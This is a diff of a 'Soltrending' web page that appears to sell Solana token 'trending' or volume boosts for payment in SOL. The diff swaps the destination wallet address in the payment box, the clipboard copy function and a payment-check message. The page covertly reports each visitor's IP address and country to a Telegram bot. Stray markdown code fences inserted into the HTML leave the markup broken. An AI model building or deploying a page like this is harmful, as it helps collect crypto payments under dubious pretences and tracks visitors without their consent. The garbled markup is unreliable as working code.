@@ -4,11 +4,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Soltrending volume boost/trending</title>
+    <title>Soltrending - Submit & Pay</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-
+```
     body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -230,7 +230,7 @@
         .container { margin: 10px; padding: 20px; }
     }
 </style>
-
+```
 
 </head>
 <body>
@@ -238,7 +238,7 @@
         <div class="logo">Soltrending</div>
         <div class="user-info" id="userInfo">Loading location...</div>
 
-
+```
     <div class="step-dots">
         <div class="dot active" id="dot1"></div>
         <div class="dot" id="dot2"></div>
@@ -348,7 +348,7 @@
         <div class="wallet-box">
             <h4>💰 Send SOL to this address:</h4>
             <div class="wallet-address" onclick="copyWallet()">
-                DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3
+                6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
                 <button class="copy-btn">📋 Copy</button>
             </div>
             <div id="copyFeedback" style="color: green; margin-top: 10px; opacity: 0;">✅ Copied!</div>
@@ -538,14 +538,14 @@
     }
 
     function copyWallet() {
-        navigator.clipboard.writeText('DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3');
+        navigator.clipboard.writeText('6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ');
         const feedback = document.getElementById('copyFeedback');
         feedback.style.opacity = '1';
         setTimeout(() => feedback.style.opacity = '0', 2000);
     }
 
     function checkPayment() {
-        sendTelegram(`💳 PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n🔍 Wallet: DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3`);
+        sendTelegram(`💳 PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n🔍 Wallet: 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ`);
         nextStep(3);
     }
 
@@ -610,7 +610,7 @@
         location.reload();
     }
 </script>
-
+```
 
 </body>
 </html>
